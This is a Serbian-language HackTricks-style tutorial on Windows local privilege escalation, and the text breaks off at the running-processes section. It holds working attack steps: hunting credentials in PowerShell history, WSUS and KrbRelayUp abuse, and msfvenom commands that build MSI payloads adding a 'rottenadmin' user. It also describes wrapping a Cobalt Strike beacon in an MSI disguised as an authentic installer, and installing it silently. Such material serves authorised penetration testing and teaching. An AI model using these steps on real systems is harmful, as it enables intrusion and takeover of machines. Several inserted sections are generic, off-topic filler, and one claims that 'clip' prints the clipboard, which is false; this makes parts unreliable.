# Lokalno eskaliranje privilegija na Windowsu

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Najbolji alat za pronalaženje vektora lokalnog eskaliranja privilegija na Windowsu:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Početna teorija o Windowsu

### Pristupni tokeni

**Ako ne znate šta su Windows pristupni tokeni, pročitajte sledeću stranicu pre nego što nastavite:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Proverite sledeću stranicu za više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windowsu, trebali biste pročitati sledeću stranicu pre nego što nastavite:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows bezbednosne kontrole

Postoje razne stvari u Windowsu koje mogu **sprečiti nabrajanje sistema**, pokretanje izvršnih datoteka ili čak **detektovati vaše aktivnosti**. Trebali biste **pročitati** sledeću **stranicu** i **nabrajati** sve ove **odbrambene mehanizme** pre nego što započnete nabrajanje eskalacije privilegija:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Informacije o sistemu

### Nabrajanje informacija o verziji

Proverite da li Windows verzija ima poznatu ranjivost (proverite i primenjene zakrpe).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Verzija Exploita

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka ima više od 4.700 bezbednosnih ranjivosti, što pokazuje **veliku površinu napada** koju Windows okruženje predstavlja.

**Na sistemu**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_

**Lokalno sa informacijama o sistemu**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi exploit-a:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su sačuvane bilo kakve akreditive/sočne informacije u okružnim varijablama?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Istorija PowerShell-a

PowerShell čuva istoriju komandi koje su izvršene tokom sesije. Ova istorija se čuva u datoteci `ConsoleHost_history.txt` u korisničkom direktorijumu. Ova datoteka sadrži sve komande koje su izvršene, zajedno sa vremenom izvršavanja.

Da biste pristupili istoriji PowerShell-a, možete koristiti sledeću putanju:

```plaintext
C:\Users\<korisničko_ime>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Takođe, možete koristiti PowerShell komandu `Get-History` da biste prikazali istoriju komandi direktno u konzoli.

Ova istorija može biti korisna prilikom istraživanja sistema i pronalaženja tragova napada ili neovlašćenog pristupa.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell transkript fajlovi

Možete naučiti kako da to uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Moduliranje beleženja

Detalji izvršavanja PowerShell cevovoda se beleže, obuhvatajući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.

Da biste omogućili ovo, pratite uputstva u odeljku "Transkript fajlovi" dokumentacije, birajući **"Moduliranje beleženja"** umesto **"Transkripcija PowerShell-a"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Da biste videli poslednjih 15 događaja iz PowerShell logova, možete izvršiti sledeću komandu:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Snimanje potpunih aktivnosti i sadržaja izvršenja skripte, osigurava da se svaki blok koda dokumentuje tokom izvršenja. Ovaj proces čuva sveobuhvatnu evidenciju svake aktivnosti, korisnu za forenziku i analizu zlonamernog ponašanja. Detaljni uvidi u proces se pružaju dokumentovanjem svih aktivnosti u trenutku izvršenja.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zapisivanje događaja za Script Block može se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste videli poslednjih 20 događaja, možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet postavke

#### Proxy Settings

#### Proxy postavke

- **Internet Explorer**: Otvorite Internet Explorer i idite na "Internet Options" u "Tools" meniju. Zatim odaberite karticu "Connections" i kliknite na "LAN settings". Ovdje možete konfigurirati proxy postavke.

- **Edge**: Otvorite Microsoft Edge i kliknite na tri točke u gornjem desnom kutu. Odaberite "Settings" i zatim "Proxy". Možete konfigurirati proxy postavke ovdje.

- **Chrome**: Otvorite Google Chrome i kliknite na tri točke u gornjem desnom kutu. Odaberite "Settings" i zatim "Advanced". U odjeljku "System" kliknite na "Open proxy settings". Ovdje možete konfigurirati proxy postavke.

- **Firefox**: Otvorite Mozilla Firefox i kliknite na tri linije u gornjem desnom kutu. Odaberite "Options" i zatim "General". U odjeljku "Network Settings" kliknite na "Settings". Ovdje možete konfigurirati proxy postavke.

#### DNS Settings

#### DNS postavke

- **Windows**: Otvorite "Control Panel" i odaberite "Network and Internet". Zatim odaberite "Network and Sharing Center" i kliknite na "Change adapter settings". Desnom tipkom miša kliknite na mrežni adapter koji koristite i odaberite "Properties". Kliknite na "Internet Protocol Version 4 (TCP/IPv4)" i zatim na "Properties". Ovdje možete konfigurirati DNS postavke.

- **Linux**: Otvorite terminal i unesite naredbu `sudo nano /etc/resolv.conf`. Ovdje možete konfigurirati DNS postavke.

- **Mac**: Otvorite "System Preferences" i odaberite "Network". Zatim odaberite mrežni adapter koji koristite i kliknite na "Advanced". U kartici "DNS" možete konfigurirati DNS postavke.

#### Firewall Settings

#### Firewall postavke

- **Windows**: Otvorite "Control Panel" i odaberite "System and Security". Zatim odaberite "Windows Defender Firewall" i kliknite na "Advanced settings". Ovdje možete konfigurirati firewall postavke.

- **Linux**: Otvorite terminal i unesite naredbu `sudo ufw status`. Ovdje možete provjeriti status firewalla.

- **Mac**: Otvorite "System Preferences" i odaberite "Security & Privacy". Zatim odaberite karticu "Firewall". Ovdje možete konfigurirati firewall postavke.

#### Antivirus Settings

#### Antivirus postavke

- **Windows**: Otvorite "Control Panel" i odaberite "System and Security". Zatim odaberite "Windows Security" i kliknite na "Virus & threat protection". Ovdje možete konfigurirati antivirus postavke.

- **Linux**: Provjerite koji antivirusni program koristite i potražite upute za konfiguraciju na web stranici proizvođača.

- **Mac**: Otvorite "System Preferences" i odaberite "Security & Privacy". Zatim odaberite karticu "Privacy" i kliknite na "Full Disk Access". Ovdje možete konfigurirati antivirus postavke.

#### User Account Control (UAC) Settings

#### Postavke User Account Control (UAC)

- **Windows**: Otvorite "Control Panel" i odaberite "User Accounts". Zatim odaberite "Change User Account Control settings". Ovdje možete konfigurirati UAC postavke.

#### Windows Update Settings

#### Postavke Windows Update-a

- **Windows**: Otvorite "Settings" i odaberite "Update & Security". Zatim odaberite "Windows Update". Ovdje možete konfigurirati postavke Windows Update-a.

#### Remote Desktop Settings

#### Postavke udaljenog radnog okruženja

- **Windows**: Otvorite "Control Panel" i odaberite "System and Security". Zatim odaberite "System" i kliknite na "Remote settings". Ovdje možete konfigurirati postavke udaljenog radnog okruženja.

#### Bluetooth Settings

#### Postavke Bluetooth-a

- **Windows**: Otvorite "Settings" i odaberite "Devices". Zatim odaberite "Bluetooth & other devices". Ovdje možete konfigurirati postavke Bluetooth-a.

#### Wi-Fi Settings

#### Postavke Wi-Fi-ja

- **Windows**: Otvorite "Settings" i odaberite "Network & Internet". Zatim odaberite "Wi-Fi". Ovdje možete konfigurirati postavke Wi-Fi-ja.

#### Power Settings

#### Postavke napajanja

- **Windows**: Otvorite "Control Panel" i odaberite "Hardware and Sound". Zatim odaberite "Power Options". Ovdje možete konfigurirati postavke napajanja.

#### Screen Lock Settings

#### Postavke zaključavanja zaslona

- **Windows**: Otvorite "Settings" i odaberite "Accounts". Zatim odaberite "Sign-in options". Ovdje možete konfigurirati postavke zaključavanja zaslona.

#### File Sharing Settings

#### Postavke dijeljenja datoteka

- **Windows**: Otvorite "Control Panel" i odaberite "Network and Internet". Zatim odaberite "Network and Sharing Center". Kliknite na "Change advanced sharing settings". Ovdje možete konfigurirati postavke dijeljenja datoteka.

#### Privacy Settings

#### Postavke privatnosti

- **Windows**: Otvorite "Settings" i odaberite "Privacy". Ovdje možete konfigurirati postavke privatnosti.

#### Device Encryption Settings

#### Postavke enkripcije uređaja

- **Windows**: Otvorite "Settings" i odaberite "Update & Security". Zatim odaberite "Device encryption". Ovdje možete konfigurirati postavke enkripcije uređaja.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diskovi

---

#### Pregled

Kada je reč o lokalnom eskalaciji privilegija na Windows operativnom sistemu, jedna od prvih stvari koje treba proveriti su diskovi. Diskovi mogu pružiti mogućnosti za izvršavanje malicioznog koda sa privilegijama višim od trenutnog korisnika.

#### Provera dostupnih diskova

Da biste proverili dostupne diskove na Windows operativnom sistemu, možete koristiti sledeće komande:

```plaintext
wmic logicaldisk get caption,description,drivetype
```

```plaintext
fsutil fsinfo drives
```

#### Provera privilegija

Da biste proverili privilegije koje imate nad određenim diskom, možete koristiti sledeću komandu:

```plaintext
icacls <putanja_do_diska>
```

Ova komanda će prikazati informacije o privilegijama za datu putanju do diska.

#### Montiranje diskova

U nekim slučajevima, možete montirati diskove na sistem kako biste dobili pristup podacima ili izvršili maliciozni kod. Da biste montirali disk, možete koristiti sledeću komandu:

```plaintext
mountvol <putanja_do_diska> <putanja_do_mape>
```

Ova komanda će montirati disk na određenu putanju do mape.

#### Zaključak

Provera dostupnih diskova i njihovih privilegija može biti korisna prilikom lokalne eskalacije privilegija na Windows operativnom sistemu. Montiranje diskova može pružiti dodatne mogućnosti za izvršavanje malicioznog koda.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju korišćenjem http**S** već http.

Započinjete proverom da li mreža koristi ne-SSL WSUS ažuriranje pokretanjem sledećeg:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ako dobijete odgovor kao što je:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` jednako `1`.

Onda, **može se iskoristiti.** Ako je poslednji registar jednak 0, tada će unos WSUS biti ignorisan.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Ovo su skripte za oružje za eksploataciju koje se koriste za ubacivanje "lažnih" ažuriranja u ne-SSL WSUS saobraćaj.

Pročitajte istraživanje ovde:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Pročitajte kompletan izveštaj ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
U osnovi, ovo je propust koji ovaj bag iskorišćava:

> Ako imamo mogućnost da izmenimo lokalni korisnički proxy, a Windows ažuriranja koriste proxy konfigurisan u postavkama Internet Explorer-a, tada imamo mogućnost da lokalno pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) da presretnemo sopstveni saobraćaj i pokrenemo kod kao privilegovan korisnik na našem uređaju.
>
> Osim toga, pošto WSUS servis koristi postavke trenutnog korisnika, koristiće i njegovu skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS ime hosta i dodamo ovaj sertifikat u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za implementaciju validacije na osnovu poverenja pri prvom korišćenju sertifikata. Ako je sertifikat koji je prikazan poveren od strane korisnika i ima ispravno ime hosta, biće prihvaćen od strane servisa.

Možete iskoristiti ovu ranjivost koristeći alat [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude oslobođen).

## KrbRelayUp

Postoji ranjivost **lokalnog eskalacije privilegija** u Windows **domenskim** okruženjima u određenim uslovima. Ovi uslovi uključuju okruženja u kojima **nije obavezno potpisivanje LDAP-a**, korisnici imaju sopstvena prava koja im omogućavaju konfigurisanje **Resource-Based Constrained Delegation (RBCD)**, i mogućnost korisnika da kreiraju računare unutar domene. Važno je napomenuti da se ovi **zahtevi** ispunjavaju korišćenjem **podrazumevanih postavki**.

Pronađite eksploataciju u [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), tada korisnici sa bilo kojim privilegijama mogu **instalirati** (izvršiti) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloadi

Metasploit payloadi su male programske jedinice koje se koriste za isporuku i izvršavanje zlonamernog koda na ciljnom sistemu. Ovi payloadi se često koriste u procesu eskalacije privilegija kako bi se stekao pristup sa višim privilegijama na lokalnom sistemu.

Metasploit nudi širok spektar payloada koji se mogu koristiti za različite svrhe, uključujući daljinsko izvršavanje koda, preuzimanje i izvršavanje datoteka, snimanje tastature i mnoge druge. Payloadi se mogu prilagoditi i konfigurisati prema potrebama napadača.

Kada se payload uspešno isporuči na ciljni sistem, napadač može preuzeti kontrolu nad sistemom i izvršavati različite zlonamerne aktivnosti. Važno je napomenuti da je upotreba Metasploit payloada ilegalna bez pristanka vlasnika sistema i može imati ozbiljne pravne posledice.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ako imate meterpreter sesiju, možete automatizovati ovu tehniku koristeći modul **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up alata da biste kreirali Windows MSI binarni fajl unutar trenutnog direktorijuma kako biste povećali privilegije. Ovaj skript ispisuje prekompajlirani MSI instalator koji traži dodavanje korisnika/grupe (tako da će vam biti potreban pristup GUI-u):
```
Write-UserAddMSI
```
Samo izvršite kreirani binarni fajl da biste povećali privilegije.

### MSI omotač

Pročitajte ovaj tutorijal da biste naučili kako da kreirate MSI omotač koristeći ove alate. Imajte na umu da možete omotati "**.bat**" fajl ako želite samo da izvršite komandne linije.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Kreiranje MSI sa WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Kreiranje MSI sa Visual Studio

* **Generišite** sa Cobalt Strike ili Metasploit **novi Windows EXE TCP payload** u `C:\privesc\beacon.exe`
* Otvorite **Visual Studio**, izaberite **Create a new project** i ukucajte "installer" u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite **Next**.
* Dajte projektu ime, kao što je **AlwaysPrivesc**, koristite **`C:\privesc`** za lokaciju, izaberite **place solution and project in the same directory**, i kliknite **Create**.
* Kliknite **Next** sve dok ne dođete do koraka 3 od 4 (izbor fajlova za uključivanje). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
* Istaknite projekat **AlwaysPrivesc** u **Solution Explorer**-u i u **Properties**, promenite **TargetPlatform** sa **x86** na **x64**.
* Postoje i druge osobine koje možete promeniti, kao što su **Author** i **Manufacturer**, što može učiniti da instalirana aplikacija izgleda autentičnije.
* Desnim klikom na projekat izaberite **View > Custom Actions**.
* Desnim klikom na **Install** izaberite **Add Custom Action**.
* Dvaput kliknite na **Application Folder**, izaberite vaš **beacon.exe** fajl i kliknite **OK**. Ovo će osigurati da se beacon payload izvrši čim se pokrene instalater.
* U **Custom Action Properties**, promenite **Run64Bit** u **True**.
* Na kraju, **izgradite** ga.
* Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### Instalacija MSI

Da biste izvršili **instalaciju** zlonamernog `.msi` fajla u **pozadini**:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always\_install\_elevated_

## Antivirus i detektori

### Postavke revizije

Ove postavke određuju što se **bilježi**, stoga trebate obratiti pažnju
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, je zanimljivo znati gde se šalju logovi.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za **upravljanje lokalnim administratorskim lozinkama**, osiguravajući da svaka lozinka bude **jedinstvena, nasumična i redovno ažurirana** na računarima koji su pridruženi domenu. Ove lozinke se sigurno čuvaju unutar Active Directory-ja i mogu im pristupiti samo korisnici koji su dobili dovoljne dozvole putem ACL-a, što im omogućava da pregledaju lokalne administratorske lozinke ako su ovlašćeni.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Ako je aktiviran, **lozinke u tekstualnom formatu se čuvaju u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA zaštita

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Lokalnu sigurnosnu agenciju (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, dodatno osiguravajući sistem.\
[**Više informacija o LSA zaštiti ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je zaštita kredencijala koji se čuvaju na uređaju od pretnji kao što su napadi poput "pass-the-hash". 
[**Više informacija o Credentials Guard-u možete pronaći ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Keširane akreditacije

**Domen akreditacije** se autentifikuje od strane **Lokalne sigurnosne vlasti** (LSA) i koristi se od strane komponenti operativnog sistema. Kada se korisnički podaci za prijavljivanje autentifikuju od strane registrovanog sigurnosnog paketa, obično se uspostavljaju domenske akreditacije za korisnika.\
[**Više informacija o keširanim akreditacijama ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici i grupe

### Nabrojavanje korisnika i grupa

Treba da proverite da li neka od grupa kojima pripadate ima zanimljiva ovlašćenja.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da povećate privilegije**. Saznajte više o privilegovanim grupama i kako ih zloupotrebiti da biste povećali privilegije ovde:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows tokeni**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o interesantnim tokenima** i kako ih zloupotrebiti:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Prijavljeni korisnici / Sesije
```bash
qwinsta
klist sessions
```
### Kućni direktorijumi

Kada se radi o lokalnom eskalaciji privilegija na Windows operativnom sistemu, kućni direktorijumi mogu biti korisni izvor informacija. Svaki korisnik ima svoj kućni direktorijum koji sadrži njegove lične podatke i postavke. Ovi direktorijumi često sadrže osetljive informacije kao što su lozinke, ključevi za šifrovanje, kolačići i druge vrste autentifikacionih podataka.

Da biste pristupili kućnom direktorijumu drugog korisnika, potrebni su vam administratorski privilegije. Međutim, postoje neke tehnike koje vam mogu pomoći da pristupite ovim direktorijumima čak i bez administratorskih privilegija. Na primer, možete iskoristiti slabosti u postavkama dozvola ili koristiti alate kao što su `AccessEnum` ili `AccessChk` da biste pronašli direktorijume sa slabim dozvolama.

Kada pristupite kućnom direktorijumu drugog korisnika, možete pretraživati ​​datoteke i mape kako biste pronašli osetljive informacije. Ovo može uključivati ​​lozinke sačuvane u pregledačima, konfiguracione fajlove aplikacija, privremene fajlove i druge vrste podataka koji mogu biti korisni za dalje napade.

Važno je napomenuti da pristupanje tuđim kućnim direktorijumima bez odobrenja vlasnika predstavlja kršenje privatnosti i može biti nezakonito. Ove tehnike treba koristiti samo u okviru legalnih aktivnosti testiranja penetracije ili sa odobrenjem vlasnika sistema.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki

Windows operativni sistem podržava postavljanje politike lozinki kako bi se osigurala sigurnost korisničkih naloga. Ova politika definiše zahteve za kreiranje i korišćenje lozinki. Evo nekoliko ključnih aspekata politike lozinki:

- **Dužina lozinke**: Definiše minimalnu dužinu lozinke koja se zahteva. Na primer, može se postaviti minimalna dužina od 8 karaktera.

- **Složenost lozinke**: Zahteva da lozinka sadrži kombinaciju različitih vrsta karaktera, kao što su velika slova, mala slova, brojevi i posebni znakovi.

- **Isticanje lozinke**: Definiše koliko dugo korisnik može koristiti istu lozinku pre nego što bude prisiljen da je promeni. Na primer, može se postaviti da lozinka ističe svakih 90 dana.

- **Blokiranje naloga**: Nakon određenog broja neuspelih pokušaja prijavljivanja, korisnički nalog može biti privremeno blokiran kako bi se sprečili napadi pogađanjem lozinke.

- **Istorija lozinki**: Ova opcija sprečava korisnike da koriste iste lozinke koje su već korišćene u prošlosti.

- **Minimalna starost lozinke**: Definiše minimalno vreme koje mora proći pre nego što korisnik može promeniti lozinku. Ovo sprečava korisnike da često menjaju lozinke kako bi izbegli politiku isticanja lozinke.

- **Maksimalni broj neuspelih pokušaja prijavljivanja**: Definiše maksimalni broj neuspelih pokušaja prijavljivanja pre nego što korisnički nalog bude privremeno blokiran.

- **Zaključavanje naloga**: Nakon određenog vremena neaktivnosti, korisnički nalog može biti automatski zaključan kako bi se sprečio neovlašćeni pristup.

Postavljanje adekvatne politike lozinki je važan korak u zaštiti Windows sistema od neovlašćenog pristupa.
```bash
net accounts
```
### Dobijanje sadržaja iz međuspremnika

Da biste dobili sadržaj iz međuspremnika na Windows operativnom sistemu, možete koristiti sledeće metode:

#### Metoda 1: Korišćenje PowerShell-a

1. Otvorite PowerShell konzolu kao administrator.
2. Izvršite sledeću komandu da biste dobili sadržaj iz međuspremnika:

```powershell
Get-Clipboard
```

#### Metoda 2: Korišćenje Command Prompt-a

1. Otvorite Command Prompt kao administrator.
2. Izvršite sledeću komandu da biste dobili sadržaj iz međuspremnika:

```shell
clip
```

Napomena: Ova komanda će sadržaj međuspremnika ispisati na ekranu.

#### Metoda 3: Korišćenje Python skripte

1. Otvorite Python interpreter ili skriptu.
2. Izvršite sledeći kod da biste dobili sadržaj iz međuspremnika:

```python
import win32clipboard

win32clipboard.OpenClipboard()
clipboard_data = win32clipboard.GetClipboardData()
win32clipboard.CloseClipboard()

print(clipboard_data)
```

Napomena: Potrebno je instalirati `pywin32` biblioteku da biste koristili ovu metodu.

#### Metoda 4: Korišćenje alata trećih lica

Postoje i razni alati trećih lica koji vam mogu pomoći da dobijete sadržaj iz međuspremnika na Windows operativnom sistemu. Neke od popularnih opcija su `Clipdiary`, `Ditto`, `Clipboard Master`, itd.

Napomena: Preuzimanje i korišćenje alata trećih lica treba obaviti pažljivo i na sopstvenu odgovornost.
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti procesi

### Dozvole za datoteke i foldere

Prvo, listanje procesa **proverava lozinke unutar komandne linije procesa**.\
Proverite da li možete **prepisati neki pokrenuti binarni fajl** ili ako imate dozvole za pisanje u folderu binarnog fajla kako biste iskoristili moguće [**napade DLL preuzimanjem kontrole**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
